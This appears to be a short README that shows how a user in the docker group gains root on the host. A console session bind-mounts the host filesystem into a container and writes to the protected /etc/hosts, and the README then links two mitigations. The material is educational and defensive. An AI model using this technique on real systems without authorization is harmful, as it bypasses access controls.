# dockerPrivilegeEscalation

It shows how to get root privileges if you may run docker containers (participating in docker group)

## Backstory
By default docker is installed on OS without special configuring. If you would like to run docker containers without sudo you should be in docker group.

## Privilege Escalation
So participating in docker group allows to **get root privileges**.  
See console commands below:  
```console
[coder@coder-srv ~]$ id
uid=1000(coder) gid=1000(coder) groups=1000(coder),994(docker)
[coder@coder-srv ~]$ echo 2 >> /etc/hosts
-bash: /etc/hosts: Permission denied
[coder@coder-srv ~]$ tail -n 2 /etc/hosts
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
127.0.0.1   coder-srv
[coder@coder-srv ~]$ docker run --mount type=bind,source=/,target=/host -it ubuntu bash
root@23071637cb99:/# echo 2 >> /host/etc/hosts
root@23071637cb99:/# exit
exit
[coder@coder-srv ~]$ tail -n 2 /etc/hosts
127.0.0.1   coder-srv
2
```

## Solutions
There are two ways:

1. [Isolate containers with a user namespace](https://docs.docker.com/engine/security/userns-remap/)
2. [Run the Docker daemon as a non-root user](https://docs.docker.com/engine/security/rootless/)
